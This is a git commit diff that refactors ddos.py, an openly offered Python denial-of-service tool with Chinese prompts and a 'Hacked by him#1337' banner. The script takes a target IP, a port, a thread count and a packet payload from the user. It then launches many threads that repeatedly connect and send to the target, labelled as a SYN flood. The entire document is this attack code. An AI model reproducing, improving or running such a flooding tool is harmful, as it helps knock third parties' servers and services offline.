45cb200ddb8b3966d7da3fe009040d04882c4376
him technology <130269588+him114514@users.noreply.github.com>
2024-04-21 23:21:47 +0800

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -1,6 +1,5 @@
 import socket
 import threading
-import time
 import os
 ip=''
 port=80
@@ -21,71 +20,62 @@ __     ___            _ _
 
 print(e1)
 print('Hacked by him#1337\nwelcome to https://space.bilibili.com/590491558 or https://github.com/him114514\n')
-class ddos:
+
+class DDoS:
     def __init__(self, host, port, pack):
         self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.client.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-        self.host=host
-        self.port=port
-        self.pack=pack
+        self.host = host
+        self.port = port
+        self.pack = pack
+    
     def syn_flood(self):
         while True:
             print("连接IP{0},端口{1}".format(self.host, self.port))
             try:
                 self.client.connect((self.host, self.port))
-                self.client.send(self.pack) 
-                
-
+                self.client.send(self.pack)
             except Exception as error:
                 print("---------------------------------------------------------")
-                print("错误:\n"+str(error))
-                print(self)
+                print("错误:\n" + str(error))
                 print("连接IP{0},端口{1}".format(self.host, self.port))
                 print("---------------------------------------------------------")
                 break
 
-def pist():
-    while 1:
+def input_settings():
+    while True:
         try:
-            global threads
-            threads=int(input("请输入线程数:\n"))
-            global port
-            port=int(input("请输入端口:\n"))
-            
-            break
-        except:
-            print('输入的不是数字,重新输！')
-            continue
+            threads = int(input("请输入线程数:\n"))
+            port = int(input("请输入端口:\n"))
+            pack = input("请设置你的数据包:\n").encode()
+            return threads, port, pack
+        except ValueError:
+            print('输入的不是数字，请重新输入！')
+
 def start():
-    while 1:
+    while True:
         print('\n--------------------------------------------------')
-        ask=input('是否要进行配置，如不配置将使用默认值\n适用于80端口的本机\n输入y以确认，输入n取消(使用默认值)：\n')
+        ask = input('是否要进行配置，如不配置将使用默认值（适用于80端口的本机）\n输入y以确认，输入n取消（使用默认值）：\n')
         print('--------------------------------------------------\n')
-        if ask=="y":
-            ip=input('请输入ip地址:\n')
-            pist()
-            pack=input('请设置你的数据包:\n')
-        
+        if ask.lower() == "y":
+            ip = input('请输入ip地址:\n')
+            threads, port, pack = input_settings()
             break
-        elif ask=="n":
+        elif ask.lower() == "n":
+            ip = ''
+            threads, port, pack = 100, 80, b'GET / HTTP/1.1\r\nHost: example.com\r\n\r\n'
             break
         else:
-            print('叫你输入y或n，谁叫你写别的？')
-            continue
-        
+            print('请输入 y 或 n')
 
-
-if __name__=="__main__":
+if __name__ == "__main__":
     start()
-    pressure=ddos(ip,port,pack)
+    pressure = DDoS(ip, port, pack)
     thread_list = []
-    for i in range(threads):
-        t = threading.Thread(target=pressure.syn_flood, args=(pressure.host, pressure.port))
+    for _ in range(threads):
+        t = threading.Thread(target=pressure.syn_flood)
         t.start()
         thread_list.append(t)
      
     for t in thread_list:
         t.join()
-
- 
-
